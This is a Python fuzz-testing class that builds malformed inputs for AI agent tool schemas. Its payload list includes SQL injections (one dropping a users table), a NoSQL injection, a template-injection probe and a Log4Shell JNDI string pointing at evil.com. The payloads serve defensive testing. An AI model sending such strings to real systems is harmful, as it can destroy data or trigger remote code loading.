import json
import random
from typing import List, Dict, Any

class SchemaFuzzer:
    """
    Automated Fuzz Testing for connected agent Tool schemas.
    Generates malformed, corrupted, or out-of-bounds inputs to break JSON parsers and logic.
    """
    def __init__(self):
        self.fuzz_strings = [
            # SQL Injections
            "' OR 1=1 --",
            "'; DROP TABLE users; --",
            "admin' --",
            
            # Buffer Overflows / Exceeding Limits
            "A" * 10000,
            
            # Type Confusion / Escaping
            "\\u0000",
            "\n\r\n\r" * 100,
            
            # NoSQL Injections
            '{"$gt": ""}',
            
            # Special bypasses
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}"
        ]

    def fuzz_schema(self, schema: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Takes an Anthropic or OpenAI style function tool schema 
        and generates an array of fuzzed payloads to hit it with.
        """
        fuzzed_payloads = []
        
        # We expect schema format like:
        # { "name": "get_weather", "input_schema": { "properties": { "location": {"type": "string"} } } }
        
        properties = schema.get("input_schema", {}).get("properties", {})
        
        for prop_name, prop_details in properties.items():
            if prop_details.get("type") == "string":
                # Fuzz string inputs
                for fuzzer in self.fuzz_strings:
                    payload = self._build_payload(properties, prop_name, fuzzer)
                    fuzzed_payloads.append({
                        "tool_name": schema.get("name"),
                        "fuzzed_property": prop_name,
                        "payload": payload,
                        "category": "String Overflow/Injection"
                    })
            elif prop_details.get("type") == "integer":
                # Fuzz integers
                fuzz_ints = [ -2147483648, 2147483647, 99999999999999999, -1, 0 ]
                for fuzzer in fuzz_ints:
                    payload = self._build_payload(properties, prop_name, fuzzer)
                    fuzzed_payloads.append({
                        "tool_name": schema.get("name"),
                        "fuzzed_property": prop_name,
                        "payload": payload,
                        "category": "Integer Boundary"
                    })
                    
        return fuzzed_payloads

    def _build_payload(self, properties: Dict[str, Any], target_prop: str, fuzzer_val: Any) -> Dict[str, Any]:
        """Builds a complete payload dict with dummy defaults and the fuzzer injected target."""
        payload = {}
        for prop, details in properties.items():
            if prop == target_prop:
                payload[prop] = fuzzer_val
            else:
                # Add sensible defaults for other required fields
                if details.get("type") == "string":
                    payload[prop] = "test"
                elif details.get("type") == "integer":
                    payload[prop] = 1
                elif details.get("type") == "boolean":
                    payload[prop] = True
        return payload

if __name__ == "__main__":
    schema = {
        "name": "lookup_user",
        "input_schema": {
            "properties": {
                "username": {"type": "string"},
                "id": {"type": "integer"}
            }
        }
    }
    fuzzer = SchemaFuzzer()
    for f in fuzzer.fuzz_schema(schema)[:5]:
        print(json.dumps(f, indent=2))
